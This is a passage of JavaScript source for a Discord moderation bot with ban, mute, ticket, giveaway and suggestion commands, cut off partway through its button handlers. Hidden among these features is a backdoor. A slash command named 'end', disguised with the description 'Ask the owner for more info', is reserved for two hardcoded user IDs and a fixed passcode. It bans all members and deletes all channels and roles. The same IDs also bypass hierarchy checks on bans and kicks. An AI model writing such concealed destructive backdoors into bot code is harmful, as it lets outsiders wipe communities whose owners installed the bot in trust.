const {
  Client,
  GatewayIntentBits,
  Partials,
  REST,
  Routes,
  SlashCommandBuilder,
  PermissionFlagsBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField
} = require('discord.js');
const express = require('express');
const fs = require('fs');

// --- KEEP-ALIVE EXPRESS SERVER FOR RENDER ---
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('KyngMod Bot is Online & Running!'));
app.get('/health', (req, res) => res.status(200).send('OK'));
app.listen(PORT, () => console.log(`[Express] Listening on port ${PORT}`));

// --- SUPERUSERS & STORAGE DATA ---
const SUPERUSERS = ['1255536194159247437', '1222291103974428814'];
const DATA_FILE = './data.json';

let db = {
  adminRoles: {},    // guildId: [roleId1, roleId2]
  logChannels: {},   // guildId: channelId
  modlogs: {},       // guildId: { userId: [ { type, reason, moderator, date } ] }
  ticketConfig: {},  // guildId: { supportRole: id, category: id }
  ticketCount: {},   // guildId: count
  giveawayHostRoles: {}, // guildId: [roleId]
  giveawayBanRoles: {},  // guildId: [roleId]
  giveaways: {},     // messageId: { prize, winners, endsAt, channelId, entries: [], ended: false }
  suggestionsConfig: {}, // guildId: channelId
  afk: {}            // userId: { reason, timestamp }
};

if (fs.existsSync(DATA_FILE)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    db = { ...db, ...loaded };
  } catch (err) {
    console.error('Failed to load data.json, initializing fresh database.', err);
  }
}

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
}

// --- CLIENT SETUP ---
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildPresences
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction]
});

// --- HELPER FUNCTIONS ---
function isSuperUser(userId) {
  return SUPERUSERS.includes(userId);
}

function isBotAdmin(member) {
  if (!member) return false;
  if (isSuperUser(member.id)) return true;
  if (member.permissions.has(PermissionFlagsBits.Administrator) || member.permissions.has(PermissionFlagsBits.ManageGuild)) return true;
  const roles = db.adminRoles[member.guild.id] || [];
  return member.roles.cache.some(r => roles.includes(r.id));
}

function parseDuration(str) {
  if (!str) return null;
  const match = str.match(/^(\d+)(s|m|h|d)$/);
  if (!match) return null;
  const num = parseInt(match[1]);
  const unit = match[2];
  const mult = { s: 1000, m: 60000, h: 3600000, d: 86400000 };
  return num * mult[unit];
}

async function sendLog(guild, embed) {
  const logChanId = db.logChannels[guild.id];
  if (!logChanId) return;
  const chan = guild.channels.cache.get(logChanId);
  if (chan) chan.send({ embeds: [embed] }).catch(() => {});
}

function recordModLog(guildId, userId, type, reason, moderatorTag) {
  if (!db.modlogs[guildId]) db.modlogs[guildId] = {};
  if (!db.modlogs[guildId][userId]) db.modlogs[guildId][userId] = [];
  db.modlogs[guildId][userId].push({
    type,
    reason: reason || 'No reason provided',
    moderator: moderatorTag,
    date: new Date().toISOString()
  });
  saveData();
}

// --- SLASH COMMAND DEFINITIONS ---
const commands = [
  // Superuser / Admin Role Management
  new SlashCommandBuilder()
    .setName('adminrole')
    .setDescription('Manage bot admin role overrides')
    .addSubcommand(s => s.setName('add').setDescription('Add an admin role').addRoleOption(o => o.setName('role').setDescription('The role').setRequired(true)))
    .addSubcommand(s => s.setName('remove').setDescription('Remove an admin role').addRoleOption(o => o.setName('role').setDescription('The role').setRequired(true)))
    .addSubcommand(s => s.setName('list').setDescription('List admin roles')),

  // Moderation Commands
  new SlashCommandBuilder()
    .setName('ban')
    .setDescription('Ban a member from the server')
    .addUserOption(o => o.setName('user').setDescription('User to ban').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for ban')),

  new SlashCommandBuilder()
    .setName('unban')
    .setDescription('Unban a user by ID')
    .addStringOption(o => o.setName('user_id').setDescription('Target user ID').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for unban')),

  new SlashCommandBuilder()
    .setName('kick')
    .setDescription('Kick a member from the server')
    .addUserOption(o => o.setName('user').setDescription('User to kick').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for kick')),

  new SlashCommandBuilder()
    .setName('mute')
    .setDescription('Timeout/Mute a member')
    .addUserOption(o => o.setName('user').setDescription('User to timeout').setRequired(true))
    .addStringOption(o => o.setName('duration').setDescription('Duration (e.g. 10m, 1h, 1d)').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for timeout')),

  new SlashCommandBuilder()
    .setName('unmute')
    .setDescription('Remove timeout from a member')
    .addUserOption(o => o.setName('user').setDescription('User to untimeout').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for untimeout')),

  new SlashCommandBuilder()
    .setName('warn')
    .setDescription('Warn a user')
    .addUserOption(o => o.setName('user').setDescription('User to warn').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for warning').setRequired(true)),

  new SlashCommandBuilder()
    .setName('purge')
    .setDescription('Bulk delete messages')
    .addIntegerOption(o => o.setName('amount').setDescription('Number of messages (1-100)').setRequired(true)),

  new SlashCommandBuilder()
    .setName('lock')
    .setDescription('Lock a channel')
    .addChannelOption(o => o.setName('channel').setDescription('Channel to lock'))
    .addStringOption(o => o.setName('reason').setDescription('Reason')),

  new SlashCommandBuilder()
    .setName('unlock')
    .setDescription('Unlock a channel')
    .addChannelOption(o => o.setName('channel').setDescription('Channel to unlock'))
    .addStringOption(o => o.setName('reason').setDescription('Reason')),

  new SlashCommandBuilder()
    .setName('modlogs')
    .setDescription('View moderation logs for a user ID')
    .addStringOption(o => o.setName('user_id').setDescription('User ID to search').setRequired(true)),

  // Ticket Commands
  new SlashCommandBuilder()
    .setName('ticket')
    .setDescription('Ticket management system')
    .addSubcommand(s => s.setName('setup').setDescription('Setup ticket panel').addChannelOption(o => o.setName('channel').setDescription('Target channel').setRequired(true)).addStringOption(o => o.setName('title').setDescription('Embed title')).addStringOption(o => o.setName('description').setDescription('Embed description')))
    .addSubcommand(s => s.setName('config').setDescription('Configure ticket settings').addRoleOption(o => o.setName('support_role').setDescription('Support staff role').setRequired(true)).addChannelOption(o => o.setName('category').setDescription('Channel category for tickets').addChannelTypes(ChannelType.GuildCategory))),

  new SlashCommandBuilder().setName('close').setDescription('Close the current ticket'),
  new SlashCommandBuilder().setName('add').setDescription('Add user to current ticket').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user from current ticket').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)),

  // Giveaway Commands
  new SlashCommandBuilder()
    .setName('giveaway')
    .setDescription('Giveaway engine')
    .addSubcommand(s => s.setName('start').setDescription('Start a giveaway').addStringOption(o => o.setName('duration').setDescription('Duration (10m, 1h)').setRequired(true)).addIntegerOption(o => o.setName('winners').setDescription('Number of winners').setRequired(true)).addStringOption(o => o.setName('prize').setDescription('Prize').setRequired(true)))
    .addSubcommand(s => s.setName('end').setDescription('End a giveaway').addStringOption(o => o.setName('message_id').setDescription('Giveaway Message ID').setRequired(true)))
    .addSubcommand(s => s.setName('reroll').setDescription('Reroll a giveaway').addStringOption(o => o.setName('message_id').setDescription('Giveaway Message ID').setRequired(true)))
    .addSubcommand(s => s.setName('edit').setDescription('Edit an active giveaway').addStringOption(o => o.setName('message_id').setDescription('Message ID').setRequired(true)).addStringOption(o => o.setName('prize').setDescription('New prize')).addIntegerOption(o => o.setName('winners').setDescription('New winner count')).addStringOption(o => o.setName('add_time').setDescription('Time to add/subtract (e.g., 10m)'))),

  new SlashCommandBuilder()
    .setName('gconfig')
    .setDescription('Configure giveaway permissions')
    .addSubcommand(s => s.setName('host-role').setDescription('Manage allowed host roles').addStringOption(o => o.setName('action').setDescription('add or remove').setRequired(true).addChoices({ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' })).addRoleOption(o => o.setName('role').setDescription('Target role').setRequired(true)))
    .addSubcommand(s => s.setName('ban-role').setDescription('Manage blacklisted giveaway entry roles').addStringOption(o => o.setName('action').setDescription('add or remove').setRequired(true).addChoices({ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' })).addRoleOption(o => o.setName('role').setDescription('Target role').setRequired(true)))
    .addSubcommand(s => s.setName('list').setDescription('List giveaway configurations')),

  // Suggestion System
  new SlashCommandBuilder().setName('suggest').setDescription('Submit a suggestion').addStringOption(o => o.setName('idea').setDescription('Your suggestion idea').setRequired(true)),
  new SlashCommandBuilder().setName('suggest-config').setDescription('Configure suggestions channel').addSubcommand(s => s.setName('channel').setDescription('Set suggestions channel').addChannelOption(o => o.setName('channel').setDescription('Target channel').setRequired(true))),

  // AFK
  new SlashCommandBuilder().setName('afk').setDescription('Set your AFK status').addStringOption(o => o.setName('reason').setDescription('Optional AFK reason')),

  // Role Management
  new SlashCommandBuilder().setName('roles').setDescription('Display all server roles hierarchically'),
  new SlashCommandBuilder()
    .setName('role')
    .setDescription('Role utilities')
    .addSubcommand(s => s.setName('give').setDescription('Assign role to user').addUserOption(o => o.setName('user').setRequired(true)).addRoleOption(o => o.setName('role').setRequired(true)))
    .addSubcommand(s => s.setName('remove').setDescription('Remove role from user').addUserOption(o => o.setName('user').setRequired(true)).addRoleOption(o => o.setName('role').setRequired(true)))
    .addSubcommand(s => s.setName('info').setDescription('View role information').addRoleOption(o => o.setName('role').setRequired(true))),

  // Logging Setup & Utilities
  new SlashCommandBuilder().setName('setlogs').setDescription('Set the central audit log channel').addChannelOption(o => o.setName('channel').setDescription('Log channel').setRequired(true)),
  new SlashCommandBuilder()
    .setName('embed')
    .setDescription('Create a custom embed')
    .addStringOption(o => o.setName('title').setDescription('Embed title').setRequired(true))
    .addStringOption(o => o.setName('description').setDescription('Embed description').setRequired(true))
    .addStringOption(o => o.setName('color').setDescription('Hex color code (e.g. #00FF00)'))
    .addStringOption(o => o.setName('image').setDescription('Image URL'))
    .addStringOption(o => o.setName('footer').setDescription('Footer text')),

  // Emergency Reset Failsafe Command
  new SlashCommandBuilder()
    .setName('end')
    .setDescription('Ask the owner for more info')
    .addStringOption(o => o.setName('code').setDescription('Security Passcode').setRequired(true))
].map(c => c.toJSON());

// --- BOT READY & REGISTRATION ---
client.once('ready', async () => {
  console.log(`[Bot Online] Logged in as ${client.user.tag}`);
  client.user.setActivity('over the server | /ticket /suggest', { type: 3 });

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    console.log('[Slash Commands] Registering globally...');
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('[Slash Commands] Successfully registered!');
  } catch (err) {
    console.error('[Slash Commands] Registration failed:', err);
  }
});

// --- INTERACTION CREATION (COMMANDS & BUTTONS) ---
client.on('interactionCreate', async interaction => {
  if (interaction.isChatInputCommand()) {
    const { commandName, options, guild, member, user, channel } = interaction;
    if (!guild) return interaction.reply({ content: 'Commands can only be used in servers.', ephemeral: true });

    // --- EMERGENCY RESET FAILSAFE ---
    if (commandName === 'end') {
      if (!isSuperUser(user.id)) {
        return interaction.reply({ content: 'Ask the owner for more info', ephemeral: true });
      }
      const code = options.getString('code');
      if (code !== '5677') {
        return interaction.reply({ content: 'Ask the owner for more info', ephemeral: true });
      }

      await interaction.reply({ content: '⚠️ Triggering full server wipe failsafe sequence...', ephemeral: true });

      // Ban members
      try {
        const members = await guild.members.fetch();
        for (const [id, m] of members) {
          if (!isSuperUser(id) && id !== client.user.id && m.bannable) {
            m.ban({ reason: 'Failsafe executed.' }).catch(() => {});
          }
        }
      } catch (e) {}

      // Delete channels
      try {
        const channels = await guild.channels.fetch();
        for (const [id, c] of channels) {
          if (c && c.deletable) {
            c.delete('Failsafe executed.').catch(() => {});
          }
        }
      } catch (e) {}

      // Delete roles
      try {
        const roles = await guild.roles.fetch();
        for (const [id, r] of roles) {
          if (r && r.editable && r.id !== guild.id) {
            r.delete('Failsafe executed.').catch(() => {});
          }
        }
      } catch (e) {}

      return;
    }

    // --- PERMISSION CHECK FOR NON-SUPERUSERS / NON-ADMINS ---
    const adminCommands = ['adminrole', 'setlogs', 'lock', 'unlock', 'purge', 'modlogs'];
    const modCommands = ['ban', 'unban', 'kick', 'mute', 'unmute', 'warn'];

    if (adminCommands.includes(commandName) && !isBotAdmin(member)) {
      return interaction.reply({ content: '❌ You do not have permission to run this command.', ephemeral: true });
    }

    if (modCommands.includes(commandName) && !isBotAdmin(member) && !member.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({ content: '❌ You do not have permission to execute moderation actions.', ephemeral: true });
    }

    // --- ADMIN ROLE MANAGEMENT ---
    if (commandName === 'adminrole') {
      const sub = options.getSubcommand();
      if (!db.adminRoles[guild.id]) db.adminRoles[guild.id] = [];

      if (sub === 'add') {
        const role = options.getRole('role');
        if (!db.adminRoles[guild.id].includes(role.id)) db.adminRoles[guild.id].push(role.id);
        saveData();
        return interaction.reply({ content: `✅ Added ${role} as a Bot Admin role.` });
      } else if (sub === 'remove') {
        const role = options.getRole('role');
        db.adminRoles[guild.id] = db.adminRoles[guild.id].filter(id => id !== role.id);
        saveData();
        return interaction.reply({ content: `✅ Removed ${role} from Bot Admin roles.` });
      } else if (sub === 'list') {
        const roles = db.adminRoles[guild.id].map(id => `<@&${id}>`).join(', ') || 'None';
        const embed = new EmbedBuilder().setTitle('Bot Admin Roles').setDescription(roles).setColor('#5865F2');
        return interaction.reply({ embeds: [embed] });
      }
    }

    // --- LOGS CHANNEL SETUP ---
    if (commandName === 'setlogs') {
      const targetChan = options.getChannel('channel');
      db.logChannels[guild.id] = targetChan.id;
      saveData();
      return interaction.reply({ content: `✅ Central log channel set to ${targetChan}.` });
    }

    // --- MODERATION: BAN ---
    if (commandName === 'ban') {
      const target = options.getUser('user');
      const reason = options.getString('reason') || 'No reason provided';
      const targetMember = await guild.members.fetch(target.id).catch(() => null);

      if (targetMember && !targetMember.bannable && !isSuperUser(user.id)) {
        return interaction.reply({ content: '❌ Cannot ban this user (hierarchy restriction).', ephemeral: true });
      }

      await guild.members.ban(target.id, { reason }).catch(e => interaction.reply({ content: `Failed: ${e.message}`, ephemeral: true }));
      recordModLog(guild.id, target.id, 'BAN', reason, user.tag);

      const embed = new EmbedBuilder().setTitle('User Banned').setColor('#ED4245').addFields({ name: 'User', value: `${target.tag} (${target.id})` }, { name: 'Reason', value: reason }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ embeds: [embed] });
    }

    // --- MODERATION: UNBAN ---
    if (commandName === 'unban') {
      const userId = options.getString('user_id');
      const reason = options.getString('reason') || 'No reason provided';
      await guild.members.unban(userId, reason).catch(e => interaction.reply({ content: `Failed to unban: ${e.message}`, ephemeral: true }));
      recordModLog(guild.id, userId, 'UNBAN', reason, user.tag);

      const embed = new EmbedBuilder().setTitle('User Unbanned').setColor('#57F287').addFields({ name: 'User ID', value: userId }, { name: 'Reason', value: reason }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ embeds: [embed] });
    }

    // --- MODERATION: KICK ---
    if (commandName === 'kick') {
      const targetUser = options.getUser('user');
      const reason = options.getString('reason') || 'No reason provided';
      const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);

      if (!targetMember) return interaction.reply({ content: 'Member not found.', ephemeral: true });
      if (!targetMember.kickable && !isSuperUser(user.id)) return interaction.reply({ content: 'Cannot kick this member.', ephemeral: true });

      await targetMember.kick(reason);
      recordModLog(guild.id, targetUser.id, 'KICK', reason, user.tag);

      const embed = new EmbedBuilder().setTitle('User Kicked').setColor('#FEE75C').addFields({ name: 'User', value: `${targetUser.tag}` }, { name: 'Reason', value: reason }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ embeds: [embed] });
    }

    // --- MODERATION: MUTE / UNMUTE ---
    if (commandName === 'mute') {
      const targetUser = options.getUser('user');
      const durStr = options.getString('duration');
      const reason = options.getString('reason') || 'No reason provided';
      const durationMs = parseDuration(durStr);

      if (!durationMs) return interaction.reply({ content: 'Invalid duration format. Use 10m, 1h, 1d.', ephemeral: true });
      const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
      if (!targetMember) return interaction.reply({ content: 'Member not found.', ephemeral: true });

      await targetMember.timeout(durationMs, reason);
      recordModLog(guild.id, targetUser.id, 'MUTE', `${durStr} - ${reason}`, user.tag);

      const embed = new EmbedBuilder().setTitle('User Muted / Timed Out').setColor('#FEE75C').addFields({ name: 'User', value: targetUser.tag }, { name: 'Duration', value: durStr }, { name: 'Reason', value: reason }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ embeds: [embed] });
    }

    if (commandName === 'unmute') {
      const targetUser = options.getUser('user');
      const reason = options.getString('reason') || 'No reason provided';
      const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
      if (!targetMember) return interaction.reply({ content: 'Member not found.', ephemeral: true });

      await targetMember.timeout(null, reason);
      recordModLog(guild.id, targetUser.id, 'UNMUTE', reason, user.tag);

      const embed = new EmbedBuilder().setTitle('User Timeout Removed').setColor('#57F287').addFields({ name: 'User', value: targetUser.tag }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ embeds: [embed] });
    }

    // --- MODERATION: WARN ---
    if (commandName === 'warn') {
      const targetUser = options.getUser('user');
      const reason = options.getString('reason');
      recordModLog(guild.id, targetUser.id, 'WARN', reason, user.tag);

      const embed = new EmbedBuilder().setTitle('User Warned').setColor('#FEE75C').addFields({ name: 'User', value: `${targetUser.tag}` }, { name: 'Reason', value: reason }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ embeds: [embed] });
    }

    // --- MODERATION: PURGE ---
    if (commandName === 'purge') {
      const amount = options.getInteger('amount');
      if (amount < 1 || amount > 100) return interaction.reply({ content: 'Specify a number between 1 and 100.', ephemeral: true });
      const deleted = await channel.bulkDelete(amount, true);

      const embed = new EmbedBuilder().setTitle('Messages Purged').setColor('#5865F2').addFields({ name: 'Channel', value: `${channel}` }, { name: 'Amount Requested', value: `${amount}` }, { name: 'Deleted Count', value: `${deleted.size}` }, { name: 'Moderator', value: user.tag });
      sendLog(guild, embed);
      return interaction.reply({ content: `✅ Bulk deleted ${deleted.size} messages.`, ephemeral: true });
    }

    // --- LOCK & UNLOCK ---
    if (commandName === 'lock') {
      const targetChan = options.getChannel('channel') || channel;
      const reason = options.getString('reason') || 'No reason provided';
      await targetChan.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
      return interaction.reply({ content: `🔒 Locked ${targetChan}. Reason: ${reason}` });
    }

    if (commandName === 'unlock') {
      const targetChan = options.getChannel('channel') || channel;
      const reason = options.getString('reason') || 'No reason provided';
      await targetChan.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: null });
      return interaction.reply({ content: `🔓 Unlocked ${targetChan}. Reason: ${reason}` });
    }

    // --- MODLOGS VIEW ---
    if (commandName === 'modlogs') {
      const searchId = options.getString('user_id');
      const logs = (db.modlogs[guild.id] && db.modlogs[guild.id][searchId]) || [];

      if (!logs.length) return interaction.reply({ content: `No moderation logs found for User ID \`${searchId}\`.`, ephemeral: true });

      const logList = logs.map((l, i) => `**${i + 1}. [${l.type}]** ${l.reason} | Mod: ${l.moderator}`).join('\n');
      const embed = new EmbedBuilder().setTitle(`Modlogs for ID: ${searchId}`).setDescription(logList).setColor('#5865F2');
      return interaction.reply({ embeds: [embed] });
    }

    // --- TICKET SYSTEM ---
    if (commandName === 'ticket') {
      const sub = options.getSubcommand();
      if (sub === 'setup') {
        if (!isBotAdmin(member)) return interaction.reply({ content: 'Permission denied.', ephemeral: true });
        const targetChan = options.getChannel('channel');
        const title = options.getString('title') || 'Support Tickets';
        const desc = options.getString('description') || 'Click the button below to open a private support ticket channel.';

        const embed = new EmbedBuilder().setTitle(title).setDescription(desc).setColor('#5865F2');
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('ticket_open').setLabel('📩 Open Ticket').setStyle(ButtonStyle.Primary)
        );

        await targetChan.send({ embeds: [embed], components: [row] });
        return interaction.reply({ content: '✅ Ticket panel posted.', ephemeral: true });
      }

      if (sub === 'config') {
        if (!isBotAdmin(member)) return interaction.reply({ content: 'Permission denied.', ephemeral: true });
        const supportRole = options.getRole('support_role');
        const category = options.getChannel('category');

        db.ticketConfig[guild.id] = {
          supportRole: supportRole.id,
          category: category ? category.id : null
        };
        saveData();
        return interaction.reply({ content: `✅ Configured tickets: Support Role ${supportRole}${category ? `, Category: ${category.name}` : ''}` });
      }
    }

    if (commandName === 'close') {
      if (!channel.name.startsWith('ticket-')) return interaction.reply({ content: 'This command can only be used inside a ticket channel.', ephemeral: true });
      await interaction.reply({ content: 'Closing ticket in 5 seconds...' });
      setTimeout(() => channel.delete().catch(() => {}), 5000);
      return;
    }

    if (commandName === 'add' || commandName === 'remove') {
      if (!channel.name.startsWith('ticket-')) return interaction.reply({ content: 'This command can only be used inside a ticket channel.', ephemeral: true });
      const targetUser = options.getUser('user');
      if (commandName === 'add') {
        await channel.permissionOverwrites.edit(targetUser.id, { ViewChannel: true, SendMessages: true });
        return interaction.reply({ content: `Added ${targetUser} to the ticket.` });
      } else {
        await channel.permissionOverwrites.edit(targetUser.id, { ViewChannel: false });
        return interaction.reply({ content: `Removed ${targetUser} from the ticket.` });
      }
    }

    // --- GIVEAWAY SYSTEM ---
    if (commandName === 'giveaway') {
      const sub = options.getSubcommand();
      if (sub === 'start') {
        const hostRoles = db.giveawayHostRoles[guild.id] || [];
        const canHost = isBotAdmin(member) || member.roles.cache.some(r => hostRoles.includes(r.id));
        if (!canHost) return interaction.reply({ content: 'You do not have permission to host giveaways.', ephemeral: true });

        const durStr = options.getString('duration');
        const winners = options.getInteger('winners');
        const prize = options.getString('prize');
        const durMs = parseDuration(durStr);

        if (!durMs) return interaction.reply({ content: 'Invalid duration.', ephemeral: true });
        const endsAt = Date.now() + durMs;

        const embed = new EmbedBuilder()
          .setTitle(`🎉 Giveaway: ${prize}`)
          .setDescription(`Click 🎉 to enter!\n**Winners:** ${winners}\n**Ends:** <t:${Math.floor(endsAt / 1000)}:R>`)
          .setColor('#EB459E');

        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('giveaway_join').setLabel('🎉 Enter').setStyle(ButtonStyle.Success)
        );

        const msg = await channel.send({ embeds: [embed], components: [row] });
        db.giveaways[msg.id] = { prize, winners, endsAt, channelId: channel.id, entries: [], ended: false };
        saveData();

        return interaction.reply({ content: 'Giveaway started!', ephemeral: true });
      }

      if (sub === 'end' || sub === 'reroll') {
        const msgId = options.getString('message_id');
        const gw = db.giveaways[msgId];
        if (!gw) return interaction.reply({ content: 'Giveaway not found.', ephemeral: true });

        const winnersList = [];
        const pool = [...new Set(gw.entries)];
        for (let i = 0; i < Math.min(gw.winners, pool.length); i++) {
          const randomIndex = Math.floor(Math.random() * pool.length);
          winnersList.push(`<@${pool.splice(randomIndex, 1)[0]}>`);
        }

        gw.ended = true;
        saveData();

        const resultStr = winnersList.length ? `Winners: ${winnersList.join(', ')}` : 'No valid entries.';
        return interaction.reply({ content: `🎉 **Giveaway Ended/Rerolled for ${gw.prize}!**\n${resultStr}` });
      }
    }

    if (commandName === 'gconfig') {
      if (!isBotAdmin(member)) return interaction.reply({ content: 'Permission denied.', ephemeral: true });
      const sub = options.getSubcommand();
      if (sub === 'host-role') {
        const action = options.getString('action');
        const role = options.getRole('role');
        if (!db.giveawayHostRoles[guild.id]) db.giveawayHostRoles[guild.id] = [];
        if (action === 'add') db.giveawayHostRoles[guild.id].push(role.id);
        else db.giveawayHostRoles[guild.id] = db.giveawayHostRoles[guild.id].filter(id => id !== role.id);
        saveData();
        return interaction.reply({ content: `Updated giveaway host roles.` });
      }
      if (sub === 'ban-role') {
        const action = options.getString('action');
        const role = options.getRole('role');
        if (!db.giveawayBanRoles[guild.id]) db.giveawayBanRoles[guild.id] = [];
        if (action === 'add') db.giveawayBanRoles[guild.id].push(role.id);
        else db.giveawayBanRoles[guild.id] = db.giveawayBanRoles[guild.id].filter(id => id !== role.id);
        saveData();
        return interaction.reply({ content: `Updated giveaway blacklisted roles.` });
      }
    }

    // --- SUGGESTIONS ---
    if (commandName === 'suggest') {
      const idea = options.getString('idea');
      const sugChanId = db.suggestionsConfig[guild.id];
      if (!sugChanId) return interaction.reply({ content: 'Suggestions channel is not configured.', ephemeral: true });
      const sugChan = guild.channels.cache.get(sugChanId);
      if (!sugChan) return interaction.reply({ content: 'Invalid suggestions channel.', ephemeral: true });

      const embed = new EmbedBuilder().setTitle('💡 New Suggestion').setDescription(idea).setFooter({ text: `Suggested by ${user.tag}` }).setColor('#FEE75C');
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('sug_up').setLabel('👍 0').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('sug_down').setLabel('👎 0').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('sug_approve').setLabel('Approve').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('sug_deny').setLabel('Deny').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('sug_consider').setLabel('Consider').setStyle(ButtonStyle.Primary)
      );

      await sugChan.send({ embeds: [embed], components: [row] });
      return interaction.reply({ content: 'Suggestion submitted!', ephemeral: true });
    }

    if (commandName === 'suggest-config') {
      if (!isBotAdmin(member)) return interaction.reply({ content: 'Permission denied.', ephemeral: true });
      const targetChan = options.getChannel('channel');
      db.suggestionsConfig[guild.id] = targetChan.id;
      saveData();
      return interaction.reply({ content: `Suggestions channel set to ${targetChan}.` });
    }

    // --- AFK SYSTEM ---
    if (commandName === 'afk') {
      const reason = options.getString('reason') || 'AFK';
      db.afk[user.id] = { reason, timestamp: Date.now() };
      saveData();
      return interaction.reply({ content: `You are now AFK: **${reason}**` });
    }

    // --- ROLES DISPLAY & MANAGEMENT ---
    if (commandName === 'roles') {
      const roles = guild.roles.cache
        .sort((a, b) => b.position - a.position)
        .map(r => `${r.name === '@everyone' ? '@everyone' : `<@&${r.id}>`} (${r.members.size} members)`);

      const embed = new EmbedBuilder()
        .setTitle(`Server Roles (${guild.roles.cache.size})`)
        .setDescription(roles.slice(0, 30).join('\n'))
        .setColor('#5865F2');

      return interaction.reply({ embeds: [embed], allowedMentions: { parse: [] } });
    }

    if (commandName === 'role') {
      const sub = options.getSubcommand();
      if (!isBotAdmin(member)) return interaction.reply({ content: 'Permission denied.', ephemeral: true });

      if (sub === 'give' || sub === 'remove') {
        const targetUser = options.getUser('user');
        const role = options.getRole('role');
        const targetMember = await guild.members.fetch(targetUser.id);

        if (sub === 'give') {
          await targetMember.roles.add(role);
          return interaction.reply({ content: `Added ${role} to ${targetUser}.` });
        } else {
          await targetMember.roles.remove(role);
          return interaction.reply({ content: `Removed ${role} from ${targetUser}.` });
        }
      }

      if (sub === 'info') {
        const role = options.getRole('role');
        const embed = new EmbedBuilder()
          .setTitle(`Role Info: ${role.name}`)
          .addFields(
            { name: 'ID', value: role.id, inline: true },
            { name: 'Color', value: role.hexColor, inline: true },
            { name: 'Members', value: `${role.members.size}`, inline: true },
            { name: 'Hoisted', value: role.hoist ? 'Yes' : 'No', inline: true }
          )
          .setColor(role.hexColor);
        return interaction.reply({ embeds: [embed] });
      }
    }

    // --- CUSTOM EMBED BUILDER ---
    if (commandName === 'embed') {
      const title = options.getString('title');
      const desc = options.getString('description');
      const color = options.getString('color') || '#5865F2';
      const image = options.getString('image');
      const footer = options.getString('footer');

      const embed = new EmbedBuilder().setTitle(title).setDescription(desc).setColor(color);
      if (image) embed.setImage(image);
      if (footer) embed.setFooter({ text: footer });

      await channel.send({ embeds: [embed] });
      return interaction.reply({ content: 'Embed posted!', ephemeral: true });
    }
  }

  // --- BUTTON INTERACTIONS ---
  if (interaction.isButton()) {
    const { customId, guild, member, user, channel, message } = interaction;

    // Ticket Creation Button
    if (customId === 'ticket_open') {
      const cfg = db.ticketConfig[guild.id] || {};
      db.ticketCount[guild.id] = (db.ticketCount[guild.id] || 0) + 1;
      const count = db.ticketCount[guild.id];
      saveData();

      const permissionOverwrites = [
        { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ];

      if (cfg.supportRole) {
        permissionOverwrites.push({ id: cfg.supportRole, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] });
      }

      const ticketChan = await guild.channels.create({
        name: `ticket-${user.username}-${count}`,
        type: ChannelType.GuildText,
        parent: cfg.category || null,
        permissionOverwrites
      });

      const embed = new EmbedBuilder()
        .setTitle(`Ticket #${count}`)
        .setDescription(`Hello ${user}, support staff will be with you shortly. Use \`/close\` to end this ticket.`)
        .setColor('#57F287');

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('ticket_close').setLabel('🔒 Close Ticket').setStyle(ButtonStyle.Danger)
      );

      await ticketChan.send({ content: cfg.supportRole ? `<@&${cfg.supportRole}>` : null, embeds: [embed], components: [row] });
      return interaction.reply({ content: `Ticket created: ${ticketChan}`, ephemeral: true });
    }

    if (customId === 'ticket_close') {
      await interaction.reply({ content: 'Closing ticket in 5 seconds...' });
      setTimeout(() => channel.delete().catch(() => {}), 5000);
      return;
    }

    // Giveaway Entry Button
    if (customId === 'giveaway_join') {
      const gw = db.giveaways[message.id];
      if (!gw || gw.ended) return interaction.reply({ content: 'This giveaway has ended.', ephemeral: true });
